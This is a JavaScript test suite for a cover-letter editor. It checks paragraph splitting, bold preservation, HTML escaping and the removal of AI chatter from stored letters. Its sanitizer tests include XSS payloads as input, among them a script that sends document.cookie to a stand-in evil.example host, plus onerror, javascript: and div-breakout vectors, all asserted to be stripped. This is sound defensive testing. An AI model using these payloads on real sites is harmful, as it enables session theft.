// The cover-letter CUSTOMIZATION page (app/(cover-letter)/edit.tsx) and everything it edits, end to end.
//   node MobileApp/scripts/test-letter-editor.js
//
// THE REPORT (2026-09-19): "make it like the Resume customization page, with multiple edit buttons: divide the paragraphs
// with edit buttons, then photo on top, then Subject, address of the employer — whatever details are on the PDF should come
// in an editable page with edit buttons … with bold formatting retained: if a word is bold it should be bold in that page
// and in the editable text box too." This suite pins:
//   1. the HTML ⇄ paragraph-card round trip (services/letterHtml.ts): an unedited AI letter splits into its paragraphs with
//      every <strong> kept, and one edited paragraph leaves the others' bold alone;
//   2. escaping: a letter's own words (an unescaped "a < b", "&amp;lt;", a <script>) are only ever TEXT on the way to the
//      editor WebView and back;
//   3. the full bold trip: card → Quill box → Done → PUT (the server's normaliser) → stored → cards again → the PDF designs'
//      HTML and the Word file, bold on every leg;
//   4. EVERY PRINTED ELEMENT IS EDITABLE: the page has a control for each (or says plainly why not — the date, the photo,
//      the signature), each writes its payload key, and each key reaches every design (7 HTML/PDF designs, the Original's
//      PDFKit generator, the 7 Word layouts) — and so does every FORMAT the paragraph box offers (edit.tsx LETTER_FORMATS:
//      bold only, because the PDFKit Original draws no italic);
//   5. the page itself, driven like a thumb in a tiny fake React runtime (the gallery suites' idea): Edit → Done saves ONE
//      PUT with only what changed, a failed save stays on screen as "Not saved" and arms the leave guard, nothing calls an
//      AI or a paid endpoint.
//
// ⚠️ MUTATION PROOF — run it against another copy to prove it still catches the bug:
//   LETTER_HTML_SRC=/tmp/naive-letterHtml.ts node MobileApp/scripts/test-letter-editor.js   (a converter that drops bold)
//   EDIT_SRC=/tmp/old-edit.tsx node MobileApp/scripts/test-letter-editor.js                 (the one-textbox editor)
//   EDIT_SRC=/tmp/italic-edit.tsx node MobileApp/scripts/test-letter-editor.js              (LETTER_FORMATS ['bold','italic']:
//                                                                                            an italic the Original PDF prints upright)
'use strict';
const fs = require('fs');
const os = require('os');
const path = require('path');
const Module = require('module');

const APP = path.join(__dirname, '..');
const ROOT = path.join(APP, '..');
const ts = require(path.join(APP, 'node_modules/typescript'));
const OUT = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cva-letter-editor-')));
const LETTER_HTML_SRC = process.env.LETTER_HTML_SRC || path.join(APP, 'services/letterHtml.ts');
const EDIT_SRC = process.env.EDIT_SRC || path.join(APP, 'app/(cover-letter)/edit.tsx');
const RICH_SRC = path.join(APP, 'components/rich-text/RichText.tsx');
// The formats the paragraph editor offers, read from the page's own source — section 4 proves each one PRINTS in every
// design, section 5 proves this is the very list the page hands the Quill box.
const EDITOR_FORMATS = (() => {
  const m = /const LETTER_FORMATS: RichFormat\[\] = \[([^\]]*)\];/.exec(fs.readFileSync(EDIT_SRC, 'utf8'));
  return m ? [...m[1].matchAll(/'([a-z]+)'/g)].map((x) => x[1]) : [];
})();

function transpile(src, name) {
  const js = ts.transpileModule(fs.readFileSync(src, 'utf8'), {
    compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2020, esModuleInterop: true, jsx: ts.JsxEmit.React },
    fileName: name,
  }).outputText;
  const p = path.join(OUT, name.replace(/\.tsx?$/, '.js'));
  fs.writeFileSync(p, js);
  return p;
}

let pass = 0, fail = 0;
const ok = (name, cond, extra) => { if (cond) pass++; else { fail++; console.log('  ✗ ' + name + (extra !== undefined ? '  → ' + JSON.stringify(extra).slice(0, 400) : '')); } };
const flush = async (n = 10) => { for (let i = 0; i < n; i++) await new Promise((r) => setImmediate(r)); };
const strongs = (h) => (String(h).match(/<strong>/g) || []).length;
const tagsOf = (h) => [...String(h).matchAll(/<\/?([a-z0-9]+)/gi)].map((m) => m[1].toLowerCase());
const SAFE_TAGS = new Set(['p', 'br', 'strong', 'em', 'ul', 'ol', 'li']);

// ── the server, with a recording database stub (the server suites' way) ──────────────────────────────────────────
process.env.GEMINI_API_KEY = process.env.GEMINI_API_KEY || 'test-key-not-used';
process.env.JWT_SECRET = process.env.JWT_SECRET || 'test-secret';
process.env.ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'test-encryption-key';
const dbPath = require.resolve(path.join(ROOT, 'db-config.js'));
require.cache[dbPath] = { id: dbPath, filename: dbPath, loaded: true, exports: {
  get: async () => null, query: async () => [], run: async () => ({ changes: 0 }),
  withTransaction: async (fn) => fn({ get: async () => null, run: async () => ({ rows: [] }), query: async () => ({ rows: [] }) }),
  isUniqueViolation: () => false, getDbType: () => 'postgres',
} };
const quietWarn = console.warn; const quietLog = console.log;
const hush = (fn) => async (...a) => { console.warn = () => {}; console.log = () => {}; try { return await fn(...a); } finally { console.warn = quietWarn; console.log = quietLog; } };

// ── the letter the AI writes (formatCoverLetterWithHTML): <p style>, UNESCAPED text, 15 bold runs ─────────────────
const PSTYLE = '<p style="margin-bottom: 15px; line-height: 1.6;">';
const P1 = 'I am writing to apply for the <strong>Senior Backend Engineer</strong> role at <strong>Nordex</strong>. With <strong>8 years</strong> building <strong>Node.js</strong> & <strong>PostgreSQL</strong> platforms, a < b trade-offs are my daily work.';
const P2 = 'At <strong>Siemens</strong> I led <strong>payments</strong>, cut latency by <strong>40%</strong>, and shipped <strong>Kafka</strong> pipelines serving <strong>2M users</strong>.<br>Also mentored <strong>6 engineers</strong>.';
const P3 = 'I would welcome the chance to bring <strong>reliability</strong>, <strong>mentoring</strong>, <strong>cloud cost</strong> savings and <strong>ownership</strong> to your team.';
const AI_LETTER = [P1, P2, P3].map((p) => PSTYLE + p + '</p>').join('');

(async () => {
  const L = require(transpile(LETTER_HTML_SRC, 'letterHtml.ts'));

  console.log('── 1. ⚠️ THE ROUND TRIP: an unedited AI letter → its paragraph cards → back, bold kept ──');
  {
    const blocks = L.splitLetterParagraphs(AI_LETTER);
    ok('the AI letter (<p style> blocks, 15 bold runs) is THREE paragraph cards', blocks.length === 3 && blocks.every((b) => b.kind === 'p'), blocks);
    ok('⚠️ …with all 15 <strong> runs kept, 5 / 6 / 4 per card', blocks.map((b) => strongs(b.html)).join(',') === '5,6,4', blocks.map((b) => strongs(b.html)));
    ok('the attributes go (no style= reaches a card)', !blocks.some((b) => /style=/.test(b.html)));
    ok('the inner <br> stays inside its paragraph', /2M users<\/strong>\.<br>Also/.test(blocks[1].html), blocks[1].html);
    const joined = L.joinLetterParagraphs(blocks);
    ok('join → split is stable (the cards of the re-joined letter are the same cards)',
      JSON.stringify(L.splitLetterParagraphs(joined)) === JSON.stringify(blocks));
    ok('…and the re-joined letter is plain <p> paragraphs with the same 15 bold runs', strongs(joined) === 15 && /^<p>I am writing/.test(joined), joined.slice(0, 80));

    // The Quill box hands back its innerHTML. Editing card 2 must leave cards 1 and 3 — and their bold — alone.
    const quill2 = '<p>At <strong>Siemens</strong> I led <strong>payments</strong> and <em>platform</em> work.</p><p><br></p>';
    const replaced = L.quillToBlocks(quill2);
    ok('Quill output with a trailing empty <p><br></p> is ONE card', replaced.length === 1 && replaced[0].html === 'At <strong>Siemens</strong> I led <strong>payments</strong> and <em>platform</em> work.', replaced);
    const edited = [blocks[0], ...replaced, blocks[2]];
    const html = L.joinLetterParagraphs(edited);
    const again = L.splitLetterParagraphs(html);
    ok('⚠️ one edited paragraph keeps the OTHERS\' bold exactly (5 and 4 runs, same html)',
      again.length === 3 && again[0].html === blocks[0].html && again[2].html === blocks[2].html && strongs(again[1].html) === 2, again.map((b) => strongs(b.html)));
    ok('Quill <strong> / <em> survive into the letter', /<em>platform<\/em>/.test(html) && /<strong>Siemens<\/strong>/.test(html));
    ok('Enter inside a paragraph makes a new card (Quill writes a new <p>) — on purpose',
      L.quillToBlocks('<p>First <strong>half</strong>.</p><p>Second half.</p>').length === 2);
    ok('an emptied box is no card at all', L.quillToBlocks('<p><br></p><p>   </p><p>&nbsp;</p>').length === 0);
    const editorHtml = L.editorHtmlOf(blocks[1]);
    ok('⚠️ the Quill box opens with the SAME bold (the card\'s <strong> runs, wrapped in one <p>)',
      editorHtml === '<p>' + blocks[1].html + '</p>' && strongs(editorHtml) === 6, editorHtml);
    ok('a list stays ONE list card with its items and their bold', (() => {
      const b = L.splitLetterParagraphs('<p>Intro</p><ul><li><b>Led</b> a team</li><li>Built APIs</li></ul><p>Outro</p>');
      return b.length === 3 && b[1].kind === 'list' && b[1].html === '<ul><li><strong>Led</strong> a team</li><li>Built APIs</li></ul>';
    })());
    ok('a plain-text letter reads as the designs read it (blank line = paragraph, newline = <br>, everything escaped)', (() => {
      const b = L.splitLetterParagraphs('Dear team,\n\nI built <b>things</b> & more.\nSecond line');
      return b.length === 2 && b[1].html === 'I built &lt;b&gt;things&lt;/b&gt; &amp; more.<br>Second line';
    })());
    ok('loose text between blocks splits on <br><br>', L.splitLetterParagraphs('Hello<br><br>World<p>Last</p>').map((b) => b.html).join('|') === 'Hello|World|Last');

    // ⚠️ THE REVIEWER'S LETTER (2026-09-14): the old **markdown** box merged two bold paragraphs into ONE run across the
    // blank line and saved them back as literal asterisks. The cards carry <strong> itself — there is nothing to merge.
    const REVIEWER = '<p><strong>Re: Application for Engineer</strong></p><p><strong>Dear Ms. Smith,</strong></p><p>Body</p>';
    const rv = L.splitLetterParagraphs(REVIEWER);
    ok('⚠️ two bold paragraphs stay two bold cards, and join back to the very same HTML (not one asterisk)',
      rv.length === 3 && rv[0].html === '<strong>Re: Application for Engineer</strong>' && rv[1].html === '<strong>Dear Ms. Smith,</strong>'
      && L.joinLetterParagraphs(rv) === REVIEWER && !/\*/.test(L.joinLetterParagraphs(rv)), rv);
    const oneTwo = L.splitLetterParagraphs('<p><strong>One</strong><br><strong>Two</strong></p>');
    ok('bold on both sides of a <br> stays two bold runs in ONE card', oneTwo.length === 1 && oneTwo[0].html === '<strong>One</strong><br><strong>Two</strong>', oneTwo);
    ok('nested <b> inside <strong> stays nested bold (never "****", never unbalanced)', L.cleanInline('<strong>a <b>b</b> c</strong>') === '<strong>a <strong>b</strong> c</strong>');
  }

  console.log('── 2. ⚠️ ESCAPING: a letter\'s words are only ever text, never markup ──');
  {
    const b = L.splitLetterParagraphs(AI_LETTER)[0];
    ok('the AI\'s unescaped "a < b" and "&" are TEXT in the card (a &lt; b, &amp;)', /a &lt; b trade-offs/.test(b.html) && /Node\.js<\/strong> &amp; <strong>/.test(b.html), b.html);
    const tricky = '<p>&lt;script&gt;alert(1)&lt;/script&gt; and &amp;lt;b&amp;gt; stay words</p>'
      + '<script>fetch("https://evil.example/?c="+document.cookie)</script><style>p{display:none}</style>'
      + '<p onclick="alert(1)" style="x">Hi <img src=x onerror=alert(1)><iframe src="http://127.0.0.1/admin">inner</iframe><a href="javascript:alert(1)">link</a> there</p>'
      + '<!-- a comment --><p><svg><script>alert(2)</script></svg>Kept</p>';
    const cards = L.splitLetterParagraphs(tricky);
    const all = cards.map((c) => c.html).join('');
    ok('⚠️ an escaped "<script>" in the text stays escaped text', /&lt;script&gt;alert\(1\)&lt;\/script&gt;/.test(all), all);
    ok('⚠️ "&amp;lt;" is decoded ONCE: the text "&lt;", never "<"', /&amp;lt;b&amp;gt; stay words/.test(all), all);
    ok('⚠️ a real <script>/<style>/<iframe>/<svg> goes WITH its content; img / a / attributes never pass',
      !/evil|cookie|display:none|inner|alert\(2\)|onerror|onclick|javascript:|<img|<a |<iframe|<svg|<script|<style/.test(all), all);
    ok('…the words around them survive', /Hi\s+link there/.test(all) && /Kept/.test(all), all);
    ok('every tag a card holds is one of p/br/strong/em/ul/ol/li', cards.every((c) => tagsOf(c.html).every((t) => SAFE_TAGS.has(t))), [...new Set(cards.flatMap((c) => tagsOf(c.html)))]);
    ok('⚠️ an unterminated <script> swallows the rest instead of leaking it', L.splitLetterParagraphs('<p>Hi</p><script>steal()').map((c) => c.html).join('|') === 'Hi');
    // Whatever the Quill box is opened with is templated into the editor page's <div id="editor">: it must never close the div
    // or open a script — whatever the stored letter held.
    const hostile = { kind: 'p', html: '</div><script>alert(1)</script><strong>ok</strong> x < y' };
    const opened = L.editorHtmlOf(hostile);
    ok('⚠️ the editor page is opened with cleaned HTML only (a stored "</div><script>" cannot break out)',
      !/<\/div>|<script/i.test(opened) && tagsOf(opened).every((t) => SAFE_TAGS.has(t)) && /<strong>ok<\/strong> x &lt; y/.test(opened), opened);
    ok('unbalanced bold is closed inside its card', L.cleanInline('<b>open') === '<strong>open</strong>' && L.cleanInline('a</strong> b') === 'a b');
    ok('numeric references decode (&#8217; is an apostrophe, not "&#8217;")', L.decodeEntities('It&#8217;s') === 'It' + String.fromCharCode(8217) + 's');
  }

  console.log('── 2b. ⚠️ A LETTER STORED WITH THE MODEL\'S JSON IN IT shows only its paragraphs (2026-09-19: "json in paragraph 5,6") ──');
  {
    // Production doc 15 (Home → Airbus) as stored: its four paragraphs + '"<br>}<br>Rishi, I have completed the cover letter …',
    // "Here is the JSON output:", a ```json block, and paragraphs 1–4 again — nine cards on this page. The server now serves it
    // repaired (GET /api/employer-docs/:id); the cards repair it themselves too (letterHtml.withoutModelJunk, which MIRRORS
    // server/utils/letterText.js), for a letter that reaches the page any other way.
    const LT = require(path.join(ROOT, 'server/utils/letterText.js'));
    const DOC15 = fs.readFileSync(path.join(ROOT, 'server/scripts/fixtures/letter-doc15-stored.html'), 'utf8');
    const JUNK = /```|&quot;(?:cover_letter|employer_name|to|subject)&quot;|Here is the JSON|I have completed the cover letter|^\}|<br>\}/;
    const cards = L.splitLetterParagraphs(DOC15);
    ok('⚠️ the stored Airbus letter is FOUR paragraph cards (it was nine) — no fence, no JSON, no chatter, nothing twice',
      cards.length === 4 && cards.every((c) => c.kind === 'p' && !JUNK.test(c.html)), cards.map((c) => c.html.slice(0, 50)));
    const server = L.splitLetterParagraphs(LT.repairLetterHtml(DOC15).html);
    ok('⚠️ …exactly the cards of the letter the SERVER serves repaired (the two repairs agree, card for card)',
      JSON.stringify(cards) === JSON.stringify(server), { app: cards.map((c) => c.html.slice(-40)), server: server.map((c) => c.html.slice(-40)) });
    ok('…the fourth ends at "consideration." (the JSON\'s closing quote and brace gone), the bold of every card kept',
      /Thank you for your consideration\.$/.test(cards[3].html) && cards.map((c) => strongs(c.html)).join() === '8,16,9,2', cards.map((c) => strongs(c.html)));
    ok('idempotent: the joined cards split into the same four cards', JSON.stringify(L.splitLetterParagraphs(L.joinLetterParagraphs(cards))) === JSON.stringify(cards));
    // The same letter UNEDITED (<p style> blocks, as the build stored it) and with its quotes as &quot;.
    const styled = DOC15.replace(/<p>/g, PSTYLE);
    ok('the unedited shape (<p style>) → the same four cards', JSON.stringify(L.splitLetterParagraphs(styled)) === JSON.stringify(cards));
    ok('…and with its quotes stored as &quot;', JSON.stringify(L.splitLetterParagraphs(DOC15.replace(/"/g, '&quot;'))) === JSON.stringify(cards));
    // A clean letter's cards are the very same array the splitter built: nothing is rewritten without the strong signal.
    const clean = L.splitLetterParagraphs(AI_LETTER);
    ok('⚠️ a clean letter is untouched: withoutModelJunk hands its cards back as the SAME array', L.withoutModelJunk(clean) === clean && clean.length === 3);
    const legit = '<p>I integrated external APIs (REST, gRPC, XML/JSON) and "shipped" weekly.</p><p>Here is what I would bring to your team:</p><p>I have completed over 40 projects for clients.</p>';
    ok('…and a letter that merely MENTIONS JSON, quotes a word or starts "Here is what…" keeps every card',
      L.splitLetterParagraphs(legit).length === 3 && !L.looksLikeModelJunk(L.splitLetterParagraphs(legit)));
    // ⚠️ A LINE THAT ONLY SOUNDS LIKE THE MODEL (review, 2026-09-19): a closing like these is the letter's own. Alone it never
    // triggers the backstop; in the Airbus junk it is not next to the JSON's opening, so it stays there too.
    const SOUNDS = ['I hope this cover letter shows why I would be a strong fit for <strong>Airbus SE</strong>. Thank you for your consideration.',
      'Please let me know if you need anything further; my portfolio is attached as requested.',
      'Feel free to contact me; I have attached my résumé alongside this cover letter.'];
    for (const s of SOUNDS) {
      const letter = AI_LETTER + '<p>' + s + '</p>';
      const c = L.splitLetterParagraphs(letter);
      ok(`⚠️ a clean letter closing with ${JSON.stringify(s.slice(0, 36))}… keeps it (4 cards, not flagged)`, c.length === 4 && !L.looksLikeModelJunk(c) && c[3].html === s, c.length);
    }
    const closing = SOUNDS[0];
    const P = DOC15.split('</p>').filter(Boolean).map((p) => p + '</p>');
    const around = P.slice(0, 3).join('') + P[3].replace(/^<p>[\s\S]*?(?="<br>\})/, '<p>' + closing) + P.slice(4, 8).join('') + '<p>' + closing + '</p>';
    const ac = L.splitLetterParagraphs(around);
    ok('⚠️ the Airbus junk around a closing that SOUNDS like the model: 4 cards, the closing kept — and the server agrees card for card',
      ac.length === 4 && ac[3].html === closing && JSON.stringify(ac) === JSON.stringify(L.splitLetterParagraphs(LT.repairLetterHtml(around).html)), ac.map((c) => c.html.slice(0, 40)));
    // ⚠️ ROUND 2 (review, 2026-09-19): a line NAMING THE FORMAT is not junk on its words either — at the end or in the middle.
    const FORMAT_CLOSINGS = ['Please let me know if you would like my certificates in the requested format.',
      'Feel free to request my portfolio in the requested format.',
      'Here are my references, available in the requested format.',
      'I hope this letter shows my fit; I can share sample API contracts in JSON format.'];
    for (const s of FORMAT_CLOSINGS) {
      const last = L.splitLetterParagraphs(AI_LETTER + '<p>' + s + '</p>');
      const P3 = AI_LETTER.split('</p>').filter(Boolean).map((p) => p + '</p>');
      const mid = L.splitLetterParagraphs(P3[0] + P3[1] + '<p>' + s + '</p>' + P3[2]);
      ok(`⚠️ ${JSON.stringify(s.slice(0, 40))}… kept as the last card and in the middle (4 cards, not flagged, the server agrees)`,
        last.length === 4 && L.decodeEntities(last[3].html) === s && !L.looksLikeModelJunk(last) && mid.length === 4 && L.decodeEntities(mid[2].html) === s
          && LT.repairLetterHtml(AI_LETTER + '<p>' + s + '</p>').repaired === false, { last: last.length, mid: mid.length });
    }
    // ⚠️ …and the model's WRAPPER inside the letter goes: its opener as the first card, its sign-off as the last.
    const WRAPS = [['<p>Sure! Here is the cover letter you asked for.</p>', ''], ['<p>Certainly! Below is the tailored cover letter.</p>', ''],
      ['<p>Sure!</p><p>Here is your cover letter.</p>', ''], ['', '<p>I hope this helps!</p>'], ['', '<p>Good luck with your application!</p>'],
      ['<p>Sure! Here is the cover letter:</p>', '<p>Hope this helps. Good luck!</p>']];
    const clean3 = L.splitLetterParagraphs(AI_LETTER);
    for (const [pre, post] of WRAPS) {
      const wrapped = pre + AI_LETTER + post;
      const c = L.splitLetterParagraphs(wrapped);
      ok(`⚠️ the model's wrapper ${JSON.stringify(L.decodeEntities((pre + post).replace(/<[^>]+>/g, ' ').trim()).slice(0, 44))} → the letter's 3 cards, exactly the server's repair`,
        L.looksLikeModelJunk(L.splitLetterCards(wrapped)) && JSON.stringify(c) === JSON.stringify(clean3)
          && JSON.stringify(c) === JSON.stringify(L.splitLetterParagraphs(LT.repairLetterHtml(wrapped).html)) && LT.repairLetterHtml(wrapped).repaired, c.map((x) => x.html.slice(0, 30)));
    }
    for (const s of ['Here is my cover letter for the Software Engineer role at Acme.', 'Of course, the output of my team speaks for itself.',
      'I hope this helps explain why I am moving into platform engineering.', 'Good luck to the team with the launch; I would love to help ship the next one.']) {
      const first = L.splitLetterParagraphs('<p>' + s + '</p>' + AI_LETTER);
      const last = L.splitLetterParagraphs(AI_LETTER + '<p>' + s + '</p>');
      ok(`a look-alike ${JSON.stringify(s.slice(0, 40))}… is kept first AND last (4 cards each, not flagged)`,
        first.length === 4 && last.length === 4 && !L.looksLikeModelJunk(first) && !L.looksLikeModelJunk(last), { first: first.length, last: last.length });
    }
    // ⚠️ THE MIRROR CANNOT DRIFT: every rule the two sides share is the same regex, character for character.
    const rulesOf = (src) => new Map([...src.matchAll(/^const ([A-Z_]+_RE) = (\/.+\/[a-z]*);$/gm)].map((m) => [m[1], m[2]]));
    const app = rulesOf(fs.readFileSync(LETTER_HTML_SRC, 'utf8'));
    const srv = rulesOf(fs.readFileSync(path.join(ROOT, 'server/utils/letterText.js'), 'utf8'));
    const SHARED = ['FENCE_RE', 'BRACE_LINE_RE', 'LETTER_KEY_LINE_RE', 'JSON_STRING_LINE_RE', 'HEADING_RE', 'RULE_RE', 'LABEL_LINE_RE', 'PARA_LABEL_RE',
      'PREAMBLE_RE', 'SURE_RE', 'DONE_RE', 'AFTERWORD_RE', 'HELPS_RE', 'ABOUT_FORMAT_RE', 'ABOUT_LETTER_RE', 'JSON_FORMAT_RE',
      'INTRODUCER_RE', 'FORMAT_TAIL_RE', 'BARE_SURE_RE', 'HERE_RE', 'MODEL_LETTER_RE', 'MODEL_COVER_LETTER_RE'];
    const drift = SHARED.filter((k) => !app.has(k) || app.get(k) !== srv.get(k));
    ok('⚠️ the app\'s junk rules are the server\'s (server/utils/letterText.js), regex for regex', drift.length === 0, drift);

    // ⚠️ A NEAR-COPY IS A COPY, ON BOTH SIDES (review round 3, 2026-09-20). The Airbus answer with one literal " in its first
    // copy was stored as the letter + a fifth paragraph: the second copy's first, WITHOUT that quote — no exact copy, so no
    // side dropped it. The rule (letterText.isNearDuplicate / letterHtml.isNearDuplicate): the same first 12 words, or 0.85 of
    // the words shared. The two sides cannot drift: the same numbers, the same word rule, the same answers.
    const numsOf = (src) => new Map([...src.matchAll(/^const (NEAR_DUP_OVERLAP|DUP_MIN_CHARS|NEAR_DUP_MAX_PARAGRAPHS|NEAR_DUP_MIN_WORDS) = ([\d.]+);/gm)].map((m) => [m[1], m[2]]));
    const appN = numsOf(fs.readFileSync(LETTER_HTML_SRC, 'utf8'));
    const srvN = numsOf(fs.readFileSync(path.join(ROOT, 'server/utils/letterText.js'), 'utf8'));
    // ⚠️ NEAR_DUP_MIN_WORDS (round 5, 2026-09-20): the word-set test and "made of earlier cards" are PROSE tests, or a
    // letterhead card and the signature card below it are "one paragraph written twice" and the signature goes.
    ok('⚠️ the near-copy numbers are the server\'s (NEAR_DUP_OVERLAP, DUP_MIN_CHARS, NEAR_DUP_MAX_PARAGRAPHS, NEAR_DUP_MIN_WORDS)',
      appN.size === 4 && appN.get('NEAR_DUP_OVERLAP') === '0.85' && appN.get('DUP_MIN_CHARS') === srvN.get('DUP_MIN_CHARS')
      && srvN.get('NEAR_DUP_OVERLAP') === '0.85' && appN.get('NEAR_DUP_MAX_PARAGRAPHS') === String(LT.NEAR_DUP_MAX_PARAGRAPHS)
      && appN.get('NEAR_DUP_MIN_WORDS') === srvN.get('NEAR_DUP_MIN_WORDS') && appN.get('NEAR_DUP_MIN_WORDS') === '25',
      { app: [...appN], server: [...srvN], srvMax: LT.NEAR_DUP_MAX_PARAGRAPHS });
    // ⚠️ AND NO "SAME OPENING" RULE ON EITHER SIDE (review round 4, 2026-09-20): round 3 called two paragraphs with the same
    // first 12 words one paragraph, so a letter's own parallel openings ("In my role as Project Manager at METASYS SOFTWARE
    // PVT. LTD. in Indore, I …") lost a card — and the next save wrote the letter back without it.
    ok('⚠️ neither side has a "same first N words" shortcut any more (NEAR_DUP_LEAD is gone)',
      !/NEAR_DUP_LEAD/.test(fs.readFileSync(LETTER_HTML_SRC, 'utf8')) && !/NEAR_DUP_LEAD/.test(fs.readFileSync(path.join(ROOT, 'server/utils/letterText.js'), 'utf8')));
    // The word rule is a RegExp built from a string (ASCII \u escapes, no \p{…} — Hermes), so it is compared as its line.
    // ⚠️ It is a single-character class walked from each end now (review 2026-09-20: `[^X]+$` tried from every character
    // of a punctuation run cost its square, and the server reads letters a client sends) — the same characters, both sides.
    const edgeOf = (src) => (src.match(/^const WORD_CHAR_RE = new RegExp\(.+\);$/m) || [null])[0];
    const appEdge = edgeOf(fs.readFileSync(LETTER_HTML_SRC, 'utf8'));
    ok('⚠️ …and so is the word rule (WORD_CHAR_RE, character for character)', !!appEdge && appEdge === edgeOf(fs.readFileSync(path.join(ROOT, 'server/utils/letterText.js'), 'utf8')), appEdge);
    const trimOf = (src) => (src.match(/while \(a < b && !WORD_CHAR_RE\.test\(w\[a\]\)\) a\+\+;[\s\S]{0,120}?b--;/) || [null])[0];
    ok('⚠️ …and both walk it the same way (trimWordEdges)', !!trimOf(fs.readFileSync(LETTER_HTML_SRC, 'utf8'))
      && trimOf(fs.readFileSync(LETTER_HTML_SRC, 'utf8')) === trimOf(fs.readFileSync(path.join(ROOT, 'server/utils/letterText.js'), 'utf8')));
    const key = (h) => L.decodeEntities(String(h).replace(/<[^>]+>/g, '')).replace(/\*\*/g, '').replace(/["“”]/g, '').replace(/\s+/g, ' ').trim().toLowerCase();
    const P4 = DOC15.split('</p>').filter(Boolean).slice(0, 4).map(key);
    const LEAD = 'in my role as project manager at metasys software pvt. ltd. in indore, i ';
    const PAIRS = [
      [P4[0], P4[1]], [P4[1], P4[2]], [P4[0], P4[3]],                                    // a letter's own paragraphs: never
      // ⚠️ nor two that only OPEN the same way, or one that QUOTES another (round 4) — both are a letter's own paragraphs
      [LEAD + 'directed a portfolio of twelve client programmes worth four million dollars and cut schedule slippage by a third over two years.',
        LEAD + 'also led the hiring of nine engineers and negotiated the vendor contracts that saved a quarter of the licence bill.'],
      ['certified scrum master and pmp with fourteen years in enterprise software delivery',
        'as a certified scrum master and pmp with fourteen years in enterprise software delivery, i have run programmes of up to forty engineers across three countries and introduced release trains that cut lead time by half.'],
      [P4[0], key(P4[0].replace('14+ years', '14+ years 27'))],                           // the critic's near-copy: always
      [P4[2], key(P4[2].replace('8+ developers', 'eight developers'))],
      ['kind regards, rishi', 'kind regards, rishi s.'],                                  // short: the length gate is the caller's
      ['', ''], ['one', 'two'],
    ];
    const answers = PAIRS.map(([a, b]) => [L.isNearDuplicate(a, b), LT.isNearDuplicate(a, b)]);
    ok('⚠️ …and the same answer on every pair (the app\'s isNearDuplicate IS the server\'s)', answers.every(([a, s]) => a === s)
      && answers.slice(0, 5).every(([a]) => a === false) && answers.slice(5, 7).every(([a]) => a === true), answers);
    // The stored shape the old reading made of that answer: copy 1 (its quote in paragraph 1), the chatter, the fence, copy 2.
    const ODD = DOC15.replace('14+ years', '14+ years 27"');
    const oc = L.splitLetterParagraphs(ODD);
    ok('⚠️ that letter as it would have been stored (a " in copy 1) → its FOUR cards: copy 2\'s near-copy of card 1 goes too',
      oc.length === 4 && /14\+ years 27/.test(L.decodeEntities(oc[0].html)) && oc.every((c) => !JUNK.test(c.html))
        && L.splitLetterCards(ODD).length === 9, oc.map((c) => c.html.slice(0, 40)));
    ok('…exactly the cards of the letter the SERVER serves repaired', JSON.stringify(oc) === JSON.stringify(L.splitLetterParagraphs(LT.repairLetterHtml(ODD).html)));
    const nearCopy =P.slice(0, 3).join('') + P[3].replace(/"<br>\}[\s\S]*<\/p>$/, '</p>') + P[0].replace('14+ years', '14+ full years');
    const nc = L.splitLetterParagraphs(nearCopy);
    ok('a clean letter with a near-copy of its first card (one word added) → flagged, and its 4 cards — the server agrees',
      L.looksLikeModelJunk(L.splitLetterCards(nearCopy)) && nc.length === 4 && !/14\+ full years/.test(nc.map((c) => c.html).join(''))
        && LT.looksContaminatedHtml(nearCopy) && JSON.stringify(nc) === JSON.stringify(L.splitLetterParagraphs(LT.repairLetterHtml(nearCopy).html)), nc.length);
    ok('…while a clean letter\'s four cards are still the same array (no card is a near-copy of another)',
      L.withoutModelJunk(L.splitLetterCards(LT.repairLetterHtml(DOC15).html)).length === 4 && !L.looksLikeModelJunk(L.splitLetterCards(LT.repairLetterHtml(DOC15).html)));
    // ⚠️ AND A REAL LETTER NEVER LOSES A CARD TO THE NEAR-COPY RULE (review round 4, 2026-09-20). Round 3 dropped a card
    // whenever two paragraphs opened with the same 12 words, or a later one QUOTED an earlier one — and Customize writes the
    // cards back, so the card was gone from the row with the next save. Both shapes here are a letter's own paragraphs.
    const KEEPERS = {
      'the same long opening twice (the same employer and title)': ['<p>I am writing about the Delivery Lead role at Globex, a programme very close to the work I have run for the last decade.</p>',
        '<p>In my role as Project Manager at METASYS SOFTWARE PVT. LTD. in Indore, I directed a portfolio of twelve client programmes worth four million dollars and cut schedule slippage by a third.</p>',
        '<p>In my role as Project Manager at METASYS SOFTWARE PVT. LTD. in Indore, I also led the hiring of nine engineers and negotiated the vendor contracts that saved a quarter of the licence bill.</p>',
        '<p>Thank you for your time; I would be glad to talk about how I can help Globex deliver its roadmap.</p>'],
      'a headline paragraph quoted inside a longer one': ['<p>I am writing about the Delivery Lead role at Globex, which matches the programmes I have run for the last decade.</p>',
        '<p>Certified Scrum Master and PMP with fourteen years in enterprise software delivery</p>',
        '<p>As a Certified Scrum Master and PMP with fourteen years in enterprise software delivery, I have run programmes of up to forty engineers across three countries and cut lead time by half.</p>',
        '<p>Thank you for considering my application; I would be glad to talk it through with your team.</p>'],
      'German paragraphs with the same opening': ['<p>hiermit bewerbe ich mich um die Stelle als Projektleiter in Ihrem Team in München, die Sie auf Ihrer Karriereseite ausgeschrieben haben.</p>',
        '<p>Während meiner Tätigkeit als Projektleiter bei der Siemens AG in München von 2019 bis 2022 habe ich die Einführung eines neuen ERP-Systems für drei Standorte verantwortet.</p>',
        '<p>Während meiner Tätigkeit als Projektleiter bei der Siemens AG in München von 2019 bis 2022 habe ich außerdem ein Team von zwölf Entwicklerinnen aufgebaut und eingearbeitet.</p>',
        '<p>Über eine Einladung zu einem Gespräch würde ich mich sehr freuen; vielen Dank für Ihre Zeit.</p>'],
    };
    for (const [name, ps] of Object.entries(KEEPERS)) {
      const letter = ps.join('');
      const c = L.splitLetterParagraphs(letter);
      ok(`⚠️ ${name} → all four cards, not flagged — and the server agrees (nothing to repair)`,
        c.length === 4 && !L.looksLikeModelJunk(L.splitLetterCards(letter)) && !LT.looksContaminatedHtml(letter) && !LT.repairLetterHtml(letter).repaired,
        { cards: c.length, flagged: L.looksLikeModelJunk(L.splitLetterCards(letter)), server: LT.looksContaminatedHtml(letter) });
    }
    // ⚠️ A <br> IS A LINE BREAK TO BOTH SIDES (review round 4): the server's repair keyed a paragraph on its text with the
